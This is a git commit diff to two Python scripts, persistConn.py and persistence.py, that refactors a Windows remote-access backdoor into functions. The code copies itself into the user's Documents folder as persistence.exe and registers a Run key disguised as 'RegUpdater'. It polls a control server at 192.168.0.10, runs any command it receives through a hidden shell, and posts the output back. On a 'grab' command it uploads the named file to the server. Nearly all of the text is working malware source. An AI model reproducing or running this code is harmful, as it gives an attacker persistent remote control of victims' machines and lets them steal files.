2b2f555b38432d1124203e7a4c74efd3631aec80
Joe Kuensting <RuriRurouni@gmail.com>
2019-01-16 19:24:58 -0600

    Fixed the persistent, connect error handling http client
    Used the same technique as in the regular persistent client; also organized my code into actual functions!

--- 2/persistConn.py
+++ 2/persistConn.py
@@ -6,17 +6,25 @@ import shutil
 import winreg
 import random
 
-path = os.getcwd().strip('\n')
-
-null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split(b'=')
-
-destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'persistence.exe'
-
-if not os.path.exists(destination):
-    shutil.copyfile(path + '\persistence.exe', str(destination))
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
-    winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
-    key.Close()
+def subprocess_args(include_stdout=True):
+    shell = True
+    if hasattr(subprocess, 'STARTUPINFO'):
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        env = os.environ
+    else:
+        si = None
+        env = None
+    if include_stdout:
+        ret = {'stdout': subprocess.PIPE}
+    else:
+        ret = {}
+    ret.update({'stdin': subprocess.PIPE,
+                'stderr': subprocess.PIPE,
+                'startupinfo': si,
+                'env': env,
+                'shell': shell})
+    return ret
 
 def connect():
     while True:
@@ -34,18 +42,31 @@ def connect():
             else:
                 post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
         else:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            CMD = subprocess.Popen(command,**subprocess_args(True))
             post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
             post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())
 
         time.sleep(3)
 
-while True:
-    try:
-        if connect() == 1:
-            break
-    except:
-        sleep_for = random.randrange(1,10)
-        time.sleep(sleep_for)       #Sleep for a random time between 1 and 10 seconds
-        #time.sleep(sleep_for * 60) #Sleep for a random time between 1 and 10 minutes
-        pass
+def main():
+    path = os.getcwd().strip('\n')
+    null,userprof = subprocess.check_output('set USERPROFILE',**subprocess_args(False)).split(b'=')
+    destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'persistence.exe'
+
+    if not os.path.exists(destination):
+        shutil.copyfile(path + '\persistence.exe', str(destination))
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
+        winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
+        key.Close()
+
+    while True:
+        try:
+            if connect() == 1:
+                break
+        except:
+            sleep_for = random.randrange(1,10)
+            time.sleep(sleep_for)       #Sleep for a random time between 1 and 10 seconds
+            #time.sleep(sleep_for * 60) #Sleep for a random time between 1 and 10 minutes
+            pass
+
+main()
--- 2/persistence.py
+++ 2/persistence.py
@@ -25,35 +25,36 @@ def subprocess_args(include_stdout=True):
                 'shell': shell})
     return ret
 
-path = os.getcwd().strip('\n')
+def main():
+    path = os.getcwd().strip('\n')
+    null,userprof = subprocess.check_output('set USERPROFILE',**subprocess_args(False)).split(b'=')
+    destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'persistence.exe'
 
-null,userprof = subprocess.check_output('set USERPROFILE',**subprocess_args(False)).split(b'=')
+    if not os.path.exists(destination):
+        shutil.copyfile(path + '\persistence.exe', str(destination))
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
+        winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
+        key.Close()
 
-destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'persistence.exe'
+    while True:
+        req = requests.get('http://192.168.0.10')
+        command = req.text
 
-if not os.path.exists(destination):
-    shutil.copyfile(path + '\persistence.exe', str(destination))
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
-    winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
-    key.Close()
-
-while True:
-    req = requests.get('http://192.168.0.10')
-    command = req.text
-
-    if "terminate" in command:
-        break
-    elif 'grab' in command:
-        grab,path = command.split(" * ")
-        if os.path.exists(path):
-            url = 'http://192.168.0.10/store'
-            files = {'file': open(path, 'rb'),'path': path}
-            r = requests.post(url, files=files)
+        if "terminate" in command:
+            break
+        elif 'grab' in command:
+            grab,path = command.split(" * ")
+            if os.path.exists(path):
+                url = 'http://192.168.0.10/store'
+                files = {'file': open(path, 'rb'),'path': path}
+                r = requests.post(url, files=files)
+            else:
+                post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
         else:
-            post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
-    else:
-        CMD = subprocess.Popen(command, **subprocess_args(True))
-        post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
-        post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())
+            CMD = subprocess.Popen(command, **subprocess_args(True))
+            post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
+            post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())
 
-    time.sleep(3)
+        time.sleep(3)
+
+main()
